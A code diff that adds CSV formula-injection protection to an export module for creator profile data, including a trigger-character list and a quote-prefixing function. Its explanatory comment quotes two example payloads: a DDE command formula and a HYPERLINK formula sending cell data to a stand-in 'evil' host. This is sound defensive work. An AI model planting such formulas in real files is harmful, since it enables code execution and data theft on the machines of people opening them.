@@ -4,13 +4,35 @@
  * Spec: RFC 4180. Fields containing commas, quotes, or newlines are wrapped
  * in double-quotes with embedded quotes doubled. Includes a UTF-8 BOM so
  * Excel opens the file with proper encoding.
+ *
+ * Formula injection: nearly every exported column is KOL-controlled text
+ * (display_name, bio, channel_name...). Excel / Sheets / LibreOffice treat a
+ * cell starting with `=`, `+`, `-`, `@`, TAB or CR as a formula, so a
+ * creator who names themselves `=cmd|'/c calc'!A1` or
+ * `=HYPERLINK("http://evil/?"&A1,"click")` gets code execution or data
+ * exfiltration on the machine of whoever opens the export. Standard
+ * mitigation (OWASP): prefix the value with a single quote, which the
+ * spreadsheet strips on display and treats as literal text.
  */
 
 const UTF8_BOM = '\uFEFF';
 
+// Leading characters a spreadsheet reads as "this is a formula".
+const FORMULA_TRIGGERS = ['=', '+', '-', '@', '\t', '\r'];
+// A bare numeric literal is never a formula, so `-50` in a payment column
+// stays a number Excel can sum instead of becoming the text `'-50`.
+const PLAIN_NUMBER_RE = /^[+-]?\d+(\.\d+)?$/;
+
+function neutralizeFormula(str) {
+  if (!str) return str;
+  if (!FORMULA_TRIGGERS.includes(str[0])) return str;
+  if (PLAIN_NUMBER_RE.test(str)) return str;
+  return `'${str}`;
+}
+
 function escapeCell(value) {
   if (value === null || value === undefined) return '';
-  const str = String(value);
+  const str = typeof value === 'number' ? String(value) : neutralizeFormula(String(value));
   if (str.includes(',') || str.includes('"') || str.includes('\n') || str.includes('\r')) {
     return `"${str.replace(/"/g, '""')}"`;
   }
@@ -111,4 +133,4 @@ const COLUMNS = {
   ],
 };
 
-module.exports = { toCsv, formatDateTime, COLUMNS };
+module.exports = { toCsv, formatDateTime, escapeCell, neutralizeFormula, COLUMNS };
